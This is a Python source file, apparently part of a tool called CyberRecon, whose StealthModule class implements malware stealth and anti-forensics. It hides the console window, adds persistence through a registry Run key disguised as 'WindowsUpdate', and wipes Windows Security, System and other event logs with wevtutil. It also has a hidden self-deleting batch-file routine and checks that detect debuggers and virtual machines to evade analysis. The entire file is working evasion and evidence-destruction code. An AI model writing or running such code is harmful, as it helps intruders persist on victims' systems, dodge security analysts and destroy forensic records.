"""
CyberRecon Stealth & Anti-Forensics Module
Self-destruct, trace cleaning, and evasion techniques.
"""

import os
import sys
import shutil
import subprocess
import tempfile
import ctypes
from pathlib import Path


class StealthModule:
    def __init__(self):
        self.temp_paths = []
        self.created_files = []

    def hide_console(self):
        if os.name == "nt":
            try:
                ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
            except:
                pass

    def add_to_startup(self, executable_path, name="WindowsUpdate"):
        if os.name != "nt":
            return False
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, name, 0, winreg.REG_SZ, executable_path)
            winreg.CloseKey(key)
            return True
        except:
            return False

    def clear_event_logs(self):
        if os.name != "nt":
            return False
        logs = ["Application", "Security", "System", "Setup", "ForwardedEvents"]
        for log in logs:
            try:
                subprocess.run(["wevtutil", "cl", log], capture_output=True)
            except:
                pass
        return True

    def wipe_temp_files(self):
        for path in self.temp_paths:
            try:
                if os.path.isfile(path):
                    os.remove(path)
                elif os.path.isdir(path):
                    shutil.rmtree(path)
            except:
                pass
        self.temp_paths.clear()

    def self_destruct(self, executable_path=None):
        print("[!] SELF-DESTRUCT SEQUENCE INITIATED")
        self.add_to_startup("", "WindowsUpdate")
        self.clear_event_logs()
        self.wipe_temp_files()
        if executable_path and os.path.exists(executable_path):
            if os.name == "nt":
                batch_path = os.path.join(tempfile.gettempdir(), "sd.bat")
                with open(batch_path, "w") as f:
                    f.write(f"@echo off\n:loop\ndel \"{executable_path}\" >nul 2>&1\nif exist \"{executable_path}\" goto loop\ndel \"%~f0\"\n")
                subprocess.Popen(["cmd", "/c", batch_path], creationflags=subprocess.CREATE_NO_WINDOW)
            else:
                try:
                    os.remove(executable_path)
                except:
                    pass
        os._exit(0)

    def check_debugger(self):
        if os.name == "nt":
            return ctypes.windll.kernel32.IsDebuggerPresent() != 0
        return False

    def check_vm(self):
        indicators = ["vbox", "vmware", "virtualbox", "qemu", "xen", "hyper-v", "parallels", "vm"]
        try:
            import psutil
            for proc in psutil.process_iter(["name"]):
                name = proc.info["name"].lower()
                for ind in indicators:
                    if ind in name:
                        return True
        except:
            pass
        try:
            import uuid
            mac = uuid.getnode()
            mac_hex = f"{mac:012x}"
            vm_macs = ["080027", "000c29", "00155d", "525400"]
            for prefix in vm_macs:
                if mac_hex.startswith(prefix):
                    return True
        except:
            pass
        return False
